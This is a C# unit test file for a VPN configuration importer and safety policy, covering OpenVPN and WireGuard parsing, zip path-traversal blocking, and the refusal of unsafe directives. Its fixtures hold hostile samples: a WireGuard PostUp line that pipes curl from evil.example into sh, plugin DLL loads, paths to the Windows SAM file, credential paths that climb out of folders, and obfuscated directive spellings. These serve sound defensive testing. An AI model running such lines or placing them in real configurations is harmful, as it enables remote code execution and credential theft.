// Copyright (C) 2026 Rana GmbH — GPLv3. See LICENSE at the repository root.

using System.IO.Compression;
using System.Text;
using NetFluss.Core.Vpn;
using Xunit;

namespace NetFluss.Core.Tests;

[Collection(LocalizationCollection.Name)]
public sealed class VpnTests : IDisposable
{
    private readonly string _directory = Path.Combine(Path.GetTempPath(), "nf-vpn-" + Guid.NewGuid().ToString("N"));

    public VpnTests() => Directory.CreateDirectory(_directory);

    public void Dispose() => Directory.Delete(_directory, recursive: true);

    private string Write(string name, string text)
    {
        var path = Path.Combine(_directory, name);
        Directory.CreateDirectory(Path.GetDirectoryName(path)!);
        File.WriteAllText(path, text);
        return path;
    }

    private const string Ovpn = """
        client
        dev tun
        proto udp
        remote vpn.example.net 1194
        remote backup.example.net 443 tcp
        ca ca.crt
        auth-user-pass
        <tls-crypt>
        remote not-a-directive 1
        </tls-crypt>
        """;

    [Fact]
    public void ImportsASingleOpenVpnConfigWithItsSidecars()
    {
        Write("ca.crt", "CERT");
        var result = VpnConfigImporter.ImportOpenVpn(Write("Zurich.ovpn", Ovpn));

        Assert.Equal("Zurich", result.SuggestedName);
        Assert.Equal(["Zurich.ovpn", "ca.crt"], result.Files.Select(f => f.Name));
        var server = Assert.Single(result.Servers);
        Assert.Equal(("vpn.example.net", 1194, "udp"), (server.Host, server.Port, server.Transport));
        Assert.True(result.RequiresCredentials);
        Assert.Empty(result.Warnings);
    }

    [Fact]
    public void FolderAndZipBecomeOneServerPerConfig()
    {
        Write("bundle/de.ovpn", "remote de.example.net 1194\nproto tcp-client");
        Write("bundle/ch.ovpn", "remote ch.example.net 443");
        Write("bundle/readme.txt", "hi");
        var folder = VpnConfigImporter.ImportOpenVpn(Path.Combine(_directory, "bundle"));
        Assert.Equal(["ch", "de"], folder.Servers.Select(s => s.Label));
        Assert.Equal("tcp", folder.Servers[1].Transport);

        var zip = Path.Combine(_directory, "Provider.zip");
        ZipFile.CreateFromDirectory(Path.Combine(_directory, "bundle"), zip);
        var zipped = VpnConfigImporter.ImportOpenVpn(zip);
        Assert.Equal("Provider", zipped.SuggestedName);
        Assert.Equal(2, zipped.Servers.Count);
        Assert.Equal(3, zipped.Files.Count);
    }

    [Fact]
    public void ZipEntriesCannotClimbOut()
    {
        var zip = Path.Combine(_directory, "evil.zip");
        using (var archive = ZipFile.Open(zip, ZipArchiveMode.Create))
        {
            using (var writer = new StreamWriter(archive.CreateEntry("../../escape.ovpn").Open()))
            {
                writer.Write("remote a 1");
            }

            using (var writer = new StreamWriter(archive.CreateEntry("ok.ovpn").Open()))
            {
                writer.Write("remote b 1");
            }
        }

        var result = VpnConfigImporter.ImportOpenVpn(zip);
        Assert.Equal(["ok.ovpn"], result.Files.Select(f => f.Name));
    }

    [Fact]
    public void NoConfigsIsAnError()
    {
        Write("empty/notes.txt", "x");
        Assert.Throws<VpnImportException>(() => VpnConfigImporter.ImportWireGuard(Path.Combine(_directory, "empty")));
    }

    [Fact]
    public void WarnsAtImportAboutWhatTheHelperWillRefuse()
    {
        var result = VpnConfigImporter.ImportOpenVpn(Write("risky.ovpn", "remote a 1\nproviders legacy default"));
        Assert.Contains("“providers”", Assert.Single(result.Warnings), StringComparison.Ordinal);
    }

    [Fact]
    public void WarnsAboutPatchedOnlyDirectives()
        => Assert.Contains("scramble", Assert.Single(VpnConfigImporter.ImportOpenVpn(Write("x.ovpn", "remote a 1\nscramble obfuscate key")).Warnings), StringComparison.Ordinal);

    private const string WireGuard = """
        [Interface]
        PrivateKey = aaaa
        Address = 10.2.0.2/32, fd00::2/128
        DNS = 10.2.0.1, 1.1.1.1, example.internal
        PostUp = curl https://evil.example | sh

        [Peer]
        PublicKey = bbbb
        AllowedIPs = 0.0.0.0/0
        Endpoint = [2001:db8::1]:51820
        """;

    [Fact]
    public void WireGuardEndpointAddressAndDns()
    {
        var result = VpnConfigImporter.ImportWireGuard(Write("Home.conf", WireGuard));
        var server = Assert.Single(result.Servers);
        Assert.Equal(("2001:db8::1", 51820, "udp"), (server.Host, server.Port, server.Transport));
        Assert.False(result.RequiresCredentials);
        Assert.Equal("10.2.0.2", VpnConfigImporter.WireGuardAddress(WireGuard));
        Assert.Equal(["10.2.0.1", "1.1.1.1"], VpnConfigImporter.WireGuardDns(WireGuard));
    }

    /// <summary>
    /// Script hooks are refused, naming the line — macOS 2.7. They used to be stripped
    /// silently, which ran a tunnel that was not the one the config described.
    /// </summary>
    [Fact]
    public void WireGuardScriptsAreRefusedByLine()
    {
        var refusal = VpnConfigPolicy.UnsafeWireGuardLine(WireGuard);
        Assert.Equal(new WireGuardRefusal(5, "PostUp"), refusal);
        Assert.Contains("5", refusal!.Describe(), StringComparison.Ordinal);
        Assert.Contains("PostUp", refusal.DescribeInvariant(), StringComparison.Ordinal);
    }

    [Fact]
    public void WireGuardScriptsAreWarnedAboutAtImport()
    {
        var result = VpnConfigImporter.ImportWireGuard(Write("Hooked.conf", WireGuard));
        Assert.Contains(result.Warnings, warning => warning.Contains("PostUp", StringComparison.Ordinal));
    }

    [Theory]
    [InlineData("[Interface]\nPrivateKey = a\n# PostUp = comment only\nAddress = 10.0.0.2/32 # trailing\n\n[Peer]\nPublicKey = b\nAllowedIPs = 0.0.0.0/0\nEndpoint = 1.2.3.4:51820\nPersistentKeepalive = 25")]
    [InlineData("﻿[Interface]\r\nPrivateKey = a\r\nDNS = 1.1.1.1\r\nMTU = 1420\r\n[Peer]\r\nPublicKey = b\r\nPresharedKey = c\r\nAllowedIPs = ::/0")]
    public void WireGuardPlainConfigsPass(string config) => Assert.Null(VpnConfigPolicy.UnsafeWireGuardLine(config));

    [Theory]
    [InlineData("[Interface]\npreup = x", 2, "preup")]
    [InlineData("[Interface]\n  PreDown=x", 2, "PreDown")]
    [InlineData("[Interface]\nPrivateKey = a\n[Script]\n", 3, "[Script]")]
    [InlineData("[Interface]\nPrivateKey a", 2, "PrivateKey a")]
    public void WireGuardUnknownKeysAreRefused(string config, int line, string key)
        => Assert.Equal(new WireGuardRefusal(line, key), VpnConfigPolicy.UnsafeWireGuardLine(config));

    [Fact]
    public void WireGuardNulIsRefused() => Assert.Equal(0, VpnConfigPolicy.UnsafeWireGuardLine("[Interface]\nPrivateKey = a\0")!.Line);

    [Theory]
    [InlineData("My VPN (Zürich)", "My-VPN--Z-rich")]
    [InlineData("ok_name=+.-x", "ok_name=+.-x")]
    [InlineData("!!!", "NetFluss")]
    [InlineData("a-very-long-tunnel-name-that-exceeds-thirty-two", "a-very-long-tunnel-name-that-exc")]
    public void WireGuardTunnelNames(string input, string expected) => Assert.Equal(expected, VpnConfigPolicy.WireGuardTunnelName(input));

    [Theory]
    [InlineData("remote a 1\nca ca.crt\ncert sub/client.crt", null)]
    [InlineData("remote a 1\nplugin evil.dll", "plugin")]
    [InlineData("remote a 1\n--config other.ovpn", "config")]
    [InlineData("status C:\\Windows\\System32\\drivers\\etc\\hosts", "status")]
    [InlineData("log-append C:\\x.log", "log-append")]
    [InlineData("writepid pid", "writepid")]
    [InlineData("management 0.0.0.0 7505", "management")]
    [InlineData("ca C:\\Windows\\System32\\config\\SAM", "ca")]
    [InlineData("auth-user-pass ../../secret.txt", "auth-user-pass")]
    [InlineData("auth-user-pass \"..\\\\..\\\\secret.txt\"", "auth-user-pass")]
    [InlineData("auth-user-pass ..\\..\\secret.txt", null)] // OpenVPN reads "....secret.txt": unquoted \ escapes
    [InlineData("auth-user-pass", null)]
    [InlineData("up up.bat\ndown down.bat", null)]
    [InlineData("<ca>\nplugin inside-a-block\n</ca>", null)]
    [InlineData("# plugin commented", null)]
    public void OpenVpnPolicy(string config, string? refused) => Assert.Equal(refused, VpnConfigPolicy.UnsafeOpenVpnDirective(config));

    [Theory]
    // Load code or move the system tools — not covered by --script-security 1.
    [InlineData("providers legacy default", "providers")]
    [InlineData("engine dynamic", "engine")]
    [InlineData("pkcs11-providers C:\\x\\p11.dll", "pkcs11-providers")]
    [InlineData("win-sys C:\\Users\\me\\fake", "win-sys")]
    // File arguments beyond the first position.
    [InlineData("http-proxy proxy.example 8080 C:\\Windows\\win.ini basic", "http-proxy")]
    [InlineData("socks-proxy proxy.example 1080 ../creds.txt", "socks-proxy")]
    [InlineData("http-proxy proxy.example 8080 auto ntlm", null)]
    [InlineData("http-proxy proxy.example 8080 creds.txt", null)]
    // Spelled so a naive scanner misses what OpenVPN still reads.
    [InlineData("\"plugin\" evil.dll", "plugin")]
    [InlineData("pl\\ugin evil.dll", "plugin")]
    [InlineData("'plugin' evil.dll", "plugin")]
    [InlineData("remote \"unterminated", "unparseable line")]
    // Inline blocks: content is skipped, but connection blocks are directives.
    [InlineData("<connection>\nremote a 1\nplugin evil.dll\n</connection>", "plugin")]
    [InlineData("<connection>\nremote a 1 udp\n</connection>", null)]
    [InlineData("<ca>\nnever closed", "unclosed <ca>")]
    [InlineData("<script>\nx\n</script>", "<script>")]
    [InlineData("<ca> trailing\nx\n</ca>", "malformed inline block")]
    // Unknown directives are refused by name rather than trusted.
    [InlineData("some-future-option 1", "some-future-option")]
    public void OpenVpnPolicy_IsAnAllowlist(string config, string? refused) => Assert.Equal(refused, VpnConfigPolicy.UnsafeOpenVpnDirective(config));

    [Fact]
    public void ARealisticProviderConfigPasses()
    {
        const string config = """
            client
            dev tun
            proto udp
            remote de.vpn.example.net 1194
            remote-random
            resolv-retry infinite
            nobind
            persist-key
            persist-tun
            remote-cert-tls server
            verify-x509-name server.example.net name
            cipher AES-256-GCM
            data-ciphers AES-256-GCM:AES-128-GCM
            auth SHA512
            auth-user-pass
            auth-nocache
            tls-version-min 1.2
            redirect-gateway def1
            block-outside-dns
            setenv opt block-outside-dns
            pull-filter ignore "route-ipv6"
            verb 3
            <ca>
            -----BEGIN CERTIFICATE-----
            MIIB...
            -----END CERTIFICATE-----
            </ca>
            key-direction 1
            <tls-auth>
            -----BEGIN OpenVPN Static key V1-----
            0123
            -----END OpenVPN Static key V1-----
            </tls-auth>
            """;
        Assert.Null(VpnConfigPolicy.UnsafeOpenVpnDirective(config));
    }

    [Fact]
    public void TokenizerFollowsOpenVpn()
    {
        Assert.Equal(["remote", "a b", "1"], VpnConfigPolicy.Tokenize("remote \"a b\" 1"));
        Assert.Equal(["x", "a\"b"], VpnConfigPolicy.Tokenize("x \"a\\\"b\""));
        Assert.Equal(["x", "a\\b"], VpnConfigPolicy.Tokenize("x 'a\\b'"));
        Assert.Equal(["route", "10.0.0.0"], VpnConfigPolicy.Tokenize("route 10.0.0.0 # comment"));
        Assert.Equal(["x", "a#b"], VpnConfigPolicy.Tokenize("x a#b"));
        Assert.Empty(VpnConfigPolicy.Tokenize("   ; comment")!);
        Assert.Null(VpnConfigPolicy.Tokenize("x 'open"));
    }

    [Theory]
    [InlineData("Work", "NetFluss-Work")]
    [InlineData("NetFluss-Work", "NetFluss-Work")]
    [InlineData(null, "NetFluss-Tunnel")]
    [InlineData("a-very-long-profile-name-indeed-yes", "NetFluss-a-very-long-profile-nam")]
    public void HelperTunnelsLiveInTheirOwnNamespace(string? requested, string expected)
        => Assert.Equal(expected, VpnConfigPolicy.HelperTunnelName(requested));

    [Fact]
    public void ManagementLinesParse()
    {
        Assert.Equal(new OpenVpnEvent.State("CONNECTED", "10.8.0.6"), OpenVpnManagementClient.Parse(">STATE:1700000000,CONNECTED,SUCCESS,10.8.0.6,203.0.113.1,1194,,"));
        Assert.Equal(new OpenVpnEvent.State("WAIT", null), OpenVpnManagementClient.Parse(">STATE:1700000000,WAIT,,,"));
        Assert.Equal(new OpenVpnEvent.ByteCount(1234, 567), OpenVpnManagementClient.Parse(">BYTECOUNT:1234,567"));
        Assert.Equal(new OpenVpnEvent.NeedCredentials("Auth", true), OpenVpnManagementClient.Parse(">PASSWORD:Need 'Auth' username/password"));
        Assert.Equal(new OpenVpnEvent.NeedCredentials("Private Key", false), OpenVpnManagementClient.Parse(">PASSWORD:Need 'Private Key' password"));
        Assert.IsType<OpenVpnEvent.AuthFailed>(OpenVpnManagementClient.Parse(">PASSWORD:Verification Failed: 'Auth'"));
        Assert.IsType<OpenVpnEvent.Hold>(OpenVpnManagementClient.Parse(">HOLD:Waiting for hold release:0"));
        Assert.Null(OpenVpnManagementClient.Parse("SUCCESS: hold release succeeded"));
        Assert.Equal("say \\\"hi\\\" \\\\", OpenVpnManagementClient.Escape("say \"hi\" \\"));
    }

    [Fact]
    public void LogSummaryPicksTheFailure()
    {
        const string log = """
            2026-10-05 10:00:00 OpenVPN 2.6.12 x86_64-w64-mingw32
            2026-10-05 10:00:01 Options error: Unrecognized option or missing or extra parameter(s) in x.ovpn:3: scramble
            2026-10-05 10:00:01 Exiting due to fatal error
            """;
        Assert.Equal(
            "Options error: Unrecognized option or missing or extra parameter(s) in x.ovpn:3: scramble — Exiting due to fatal error",
            OpenVpnManagementClient.SummarizeLog(log));
    }

    [Fact]
    public void StoreRoundTripsProfilesAndKeepsFilesInside()
    {
        var store = new VpnProfileStore(Path.Combine(_directory, "store"));
        var profile = new VpnProfile { Name = "Work", Kind = VpnProtocol.WireGuard, ConfigFileName = "sub/a.conf", Options = new VpnProfileOptions { AutoReconnect = true } };
        store.WriteFiles(profile.Id, [new VpnConfigFile("sub/a.conf", Encoding.UTF8.GetBytes("x")), new VpnConfigFile("../evil.conf", [1])]);
        store.Save([profile]);

        var loaded = Assert.Single(store.Load());
        Assert.Equal((profile.Id, profile.Name, profile.Kind, profile.ConfigFileName, profile.Options), (loaded.Id, loaded.Name, loaded.Kind, loaded.ConfigFileName, loaded.Options));
        Assert.True(File.Exists(store.ConfigPath(loaded, null)));
        Assert.False(File.Exists(Path.Combine(_directory, "store", "evil.conf")));
        Assert.Contains("\"WireGuard\"", File.ReadAllText(Path.Combine(_directory, "store", "profiles.json")), StringComparison.Ordinal);

        store.RemoveFiles(profile.Id);
        Assert.False(Directory.Exists(store.ProfileDirectory(profile.Id)));
    }
}
